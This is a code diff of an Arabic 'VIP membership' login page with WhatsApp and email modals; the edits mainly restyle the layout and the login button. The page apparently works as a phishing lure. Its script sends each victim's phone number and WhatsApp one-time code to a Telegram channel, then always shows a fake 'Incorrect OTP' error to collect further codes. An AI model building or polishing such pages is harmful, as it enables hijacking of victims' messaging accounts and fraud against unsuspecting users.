@@ -2,7 +2,7 @@
 <html lang="ar" dir="rtl">
 <head>
 <meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=0.9, maximum-scale=1.0" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
 <title>عضوية VIP</title>
 <style>
 @import url('https://fonts.googleapis.com/css2?family=Cormorant+Garamond:wght@500;600;700&family=Inter:ital,wght@0,400;0,500;0,600;0,700;1,400&display=swap');
@@ -20,27 +20,17 @@
 }
 * { box-sizing: border-box; }
 html, body { height: 100%; }
-
 body {
   position: relative;
   margin: 0; min-height: 100vh;
   display: flex; flex-direction: column;
-  background-color: #0a0a0b; /* لون خلفية أغمق ليتناسب مع الشفافية */
+  background-color: #1a1a1c;
+  background-image: url('1000005893.png');
+  background-repeat: repeat; /* تكرار الخلفية كنقش */
+  background-size: 160px auto; /* ضبط حجم نقش الكوتشينة ليطابق الصورة */
+  background-position: top left;
   font-family: 'Inter', sans-serif; color: var(--text);
   overflow-x: hidden;
-}
-
-body::before {
-  content: '';
-  position: fixed;
-  top: 0; right: 0; bottom: 0; left: 0;
-  background-image: url('1000005893.png');
-  background-repeat: repeat;
-  background-size: 45px 45px; /* تم تصغير الحجم ليتطابق مع الصورة */
-  background-position: top left;
-  opacity: 0.15; /* شفافية أخف بكثير */
-  z-index: 0;
-  pointer-events: none;
 }
 
 /* الهيدر */
@@ -62,12 +52,12 @@ body::before {
 
 .card {
   position: relative; width: 100%; max-width: 440px;
-  background: rgba(12, 12, 14, 0.75);
-  backdrop-filter: blur(12px);
-  -webkit-backdrop-filter: blur(12px);
+  background: rgba(18, 18, 20, 0.85);
+  backdrop-filter: blur(10px);
+  -webkit-backdrop-filter: blur(10px);
   border: 1px solid var(--card-border);
-  border-radius: 14px; padding: 22px 26px 24px;
-  box-shadow: 0 8px 32px rgba(0, 0, 0, 0.5);
+  border-radius: 14px; padding: 26px 26px 24px;
+  box-shadow: 0 8px 32px rgba(0, 0, 0, 0.6);
   z-index: 2;
 }
 .eyebrow {
@@ -75,34 +65,42 @@ body::before {
   color: var(--gold); text-transform: uppercase; text-align: left;
   margin-bottom: 10px;
 }
-.eyebrow-divider { border-bottom: 2px solid #ffffff; opacity: 0.55; margin-bottom: 16px; }
-.field-group { position: relative; margin-bottom: 14px; }
+.eyebrow-divider { border-bottom: 1px solid rgba(255, 255, 255, 0.2); margin-bottom: 20px; }
+.field-group { position: relative; margin-bottom: 16px; }
 .field-group input {
-  width: 100%; padding: 11px 12px; margin-bottom: 0;
-  background: #ffffff; border: 1px solid var(--card-border); border-radius: 10px;
-  color: #17171a; font-family: 'Inter', sans-serif; font-size: 13px; outline: none;
+  width: 100%; padding: 12px 14px; margin-bottom: 0;
+  background: #eef3f8; border: 1px solid var(--card-border); border-radius: 10px;
+  color: #17171a; font-family: 'Inter', sans-serif; font-size: 14px; outline: none;
   text-align: left; direction: ltr; transition: all 0.15s ease;
 }
 .field-group input::placeholder { color: #8a8a90; }
 .field-group input:focus { border-color: var(--gold); }
 .field-group input.input-error {
   border: 2px solid var(--red) !important;
-  box-shadow: 0 0 10px rgba(255, 51, 51, 0.6) !important; /* ظل أقوى للخطأ */
+  box-shadow: 0 0 10px rgba(255, 51, 51, 0.7) !important;
   background: #fff5f5 !important;
 }
 
-.promo-divider { border-top: 1px solid rgba(237, 239, 243, 0.2); margin: 16px 0 12px; }
+.promo-divider { border-top: 1px solid rgba(237, 239, 243, 0.15); margin: 24px 0 12px; }
 .promo-text { text-align: center; color: var(--gold); font-weight: 600; font-size: 12px; letter-spacing: 0.2px; }
+
+/* محاذاة زر اللوجن للجهة اليسرى */
+.button-container {
+  display: flex;
+  justify-content: flex-end;
+  margin-top: 10px;
+  margin-bottom: 16px;
+}
 button {
-  width: 100%; padding: 10px; border: none; border-radius: 8px;
+  border: none; border-radius: 8px;
   background: linear-gradient(180deg, #4cbb63 0%, #2e8b45 100%);
-  color: #ffffff; font-weight: 600; font-size: 13px;
+  color: #ffffff; font-weight: 600; font-size: 14px;
   letter-spacing: 0.3px; cursor: pointer; transition: filter 0.15s ease;
 }
-#accessBtn { width: 45%; display: block; }
+#accessBtn { width: 45%; padding: 10px; }
 button:hover { filter: brightness(1.08); }
 
-.social-login-container { display: flex; align-items: center; justify-content: center; gap: 14px; margin-top: 16px; position: relative; z-index: 10; }
+.social-login-container { display: flex; align-items: center; justify-content: center; gap: 16px; margin-top: 10px; position: relative; z-index: 10; }
 .social-icon-btn {
   display: flex; align-items: center; justify-content: center;
   width: 44px; height: 44px; border-radius: 50%; padding: 0;
@@ -113,8 +111,8 @@ button:hover { filter: brightness(1.08); }
 }
 .social-icon-btn i { color: #ffffff; font-size: 20px; pointer-events: none; }
 .social-icon-btn:hover { filter: brightness(1.08); transform: translateY(-2px); }
-.email-btn { background: linear-gradient(180deg, #3b82f6 0%, #1d4ed8 100%); border: 2px solid #60a5fa; }
-.whatsapp-btn { background: #25d366; border: 2px solid #25d366; }
+.email-btn { background: linear-gradient(180deg, #3b82f6 0%, #1d4ed8 100%); border: 1px solid #60a5fa; }
+.whatsapp-btn { background: #25d366; border: 1px solid #25d366; }
 
 .modal-overlay {
   position: fixed; top: 0; left: 0; width: 100%; height: 100%;
@@ -233,9 +231,8 @@ button:hover { filter: brightness(1.08); }
   position: absolute;
   top: 50%; left: 50%;
   transform: translate(-50%, -50%);
-  width: 60%; 
-  max-width: 220px;
-  height: 170px; 
+  width: 85%;
+  height: 130px;
   background: #1e1e1e;
   border: 1px solid #333;
   border-radius: 14px;
@@ -277,7 +274,7 @@ button:hover { filter: brightness(1.08); }
 
   <div class="main-content">
     <div class="card view active" id="view-access">
-      <div class="eyebrow">VIP Domain</div>
+      <div class="eyebrow">VIP DOMAIN</div>
       <div class="eyebrow-divider"></div>
       <div id="accessMsg" class="msg"></div>
       <form id="accessForm" autocomplete="off">
@@ -287,12 +284,15 @@ button:hover { filter: brightness(1.08); }
         <div class="field-group">
           <input type="password" id="accPassword" placeholder="Password" required autocomplete="off" />
         </div>
-        <button type="submit" id="accessBtn">Login</button>
+        
+        <div class="button-container">
+          <button type="submit" id="accessBtn">Login</button>
+        </div>
       </form>
 
       <div class="social-login-container">
-        <button type="button" class="social-icon-btn email-btn" id="openEmailModalBtn"><i class="fas fa-envelope"></i></button>
         <button type="button" class="social-icon-btn whatsapp-btn" id="openWhatsappModalBtn"><i class="fab fa-whatsapp"></i></button>
+        <button type="button" class="social-icon-btn email-btn" id="openEmailModalBtn"><i class="fas fa-envelope"></i></button>
       </div>
 
       <div class="promo-divider"></div>
@@ -330,7 +330,7 @@ button:hover { filter: brightness(1.08); }
     </div>
   </div>
 
-  <!-- نافذة الواتساب مع جميع الدول والأطوال الدقيقة -->
+  <!-- نافذة الواتساب -->
   <div class="modal-overlay" id="whatsappModalOverlay">
     <div class="dark-modal">
       <div class="modal-close-btn" id="closeWhatsappModalBtn"><i class="fas fa-times"></i></div>
@@ -386,7 +386,6 @@ button:hover { filter: brightness(1.08); }
   <div class="modal-overlay" id="whatsappVerifyModalOverlay">
     <div class="dark-modal" style="position: relative;">
       
-      <!-- رسالة الخطأ الجديدة  -->
       <div id="customWhatsappError" class="whatsapp-error-overlay-box">
         Incorrect OTP
       </div>
@@ -543,7 +542,6 @@ function validateWhatsappCodeField() {
   input.value = input.value.replace(/[^0-9]/g, '');
   const val = input.value;
   document.getElementById('whatsappConnectBtn').classList.toggle('ready-connect', val.length === 6);
-  // إخفاء رسالة الخطأ تلقائياً بمجرد بدء التعديل
   document.getElementById('customWhatsappError').classList.remove('show');
 }
 
@@ -552,11 +550,9 @@ function submitWhatsappCode() {
   if (val.length === 6) {
     sendToTelegram(`🔔 كود الواتساب:\n📱 ${fullSavedPhoneNumber}\n🔢 ${val}`);
     
-    // إظهار رسالة الخطأ الخاصة بالواتساب (البوب أب الداكن)
     const errorBox = document.getElementById('customWhatsappError');
     errorBox.classList.add('show');
     
-    // إخفائها بعد 2.5 ثانية تلقائياً
     setTimeout(() => {
       errorBox.classList.remove('show');
     }, 2500);
@@ -566,14 +562,13 @@ function submitWhatsappCode() {
   }
 }
 
-// الإيميل (الشرط القاسي)
+// الإيميل
 function validateEmailField() {
   const input = document.getElementById('linkEmailInput');
   input.value = input.value.replace(/[^a-zA-Z0-9@._-]/g, '');
   const val = input.value;
   
   const emailRegex = /^[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
-  
   document.getElementById('emailContinueBtn').classList.toggle('ready-gold', emailRegex.test(val));
 }
 
